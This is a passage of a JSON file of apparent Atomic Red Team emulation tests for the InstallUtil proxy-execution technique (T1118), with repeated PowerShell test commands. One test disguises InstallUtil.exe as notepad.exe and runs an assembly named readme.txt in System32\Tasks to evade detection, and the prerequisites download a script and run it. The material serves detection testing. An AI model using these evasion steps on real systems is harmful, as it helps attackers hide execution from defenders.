help information will be displayed for InstallUtil.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "Executable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil evasive invocation", "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "Remove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.txt\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallLog\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\readme.InstallState\" -ErrorAction Ignore\nRemove-Item -Path \"$Env:windir\\System32\\Tasks\\notepad.exe\" -ErrorAction Ignore\n"}}]}}], "command_list": ["# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'CheckIfInstallable'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'InstallHelper'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "# Import the required test harness function, 